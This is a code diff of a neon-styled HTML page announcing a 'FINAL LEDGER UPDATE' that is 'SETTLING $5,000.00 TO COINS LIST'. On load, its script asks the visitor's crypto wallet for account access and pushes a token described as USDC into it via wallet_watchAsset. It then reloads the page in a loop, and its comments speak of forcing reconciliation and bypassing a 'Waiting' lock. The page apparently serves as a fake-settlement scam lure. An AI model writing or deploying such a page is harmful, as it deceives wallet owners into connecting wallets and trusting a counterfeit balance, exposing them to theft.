@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FINAL STATE RE-SYNC V400</title>
+    <title>FINAL LEDGER UPDATE V500</title>
     <style>
         body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .ui-frame { border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; width: 85%; }
     </style>
 </head>
-<body onload="v400_global_sync()">
-    <div class="ui-frame">GLOBAL STATE SYNC<br>SETTLING $5,000.00<br>TO COINS LIST</div>
+<body onload="v500_ledger_update()">
+    <div class="ui-frame">FINAL LEDGER UPDATE<br>SETTLING $5,000.00<br>TO COINS LIST</div>
 
     <script>
-        async function v400_global_sync() {
+        async function v500_ledger_update() {
             if (window.ethereum) {
                 try {
-                    // Step 1: Force a fresh authentication layer
+                    // Step 1: Establish High-Priority Session
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Step 2: Push the USDC Asset Metadata to the front of the UI
+                    // Step 2: Force Asset Reconciliation
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -33,8 +33,8 @@
                         },
                     });
                 } finally {
-                    // Step 3: Wait 5 seconds for the RPC nodes to update the front-end
-                    setTimeout(() => { window.location.reload(); }, 5000);
+                    // Step 3: Refresh to bypass the 'Waiting' display lock
+                    setTimeout(() => { window.location.reload(); }, 4000);
                 }
             }
         }
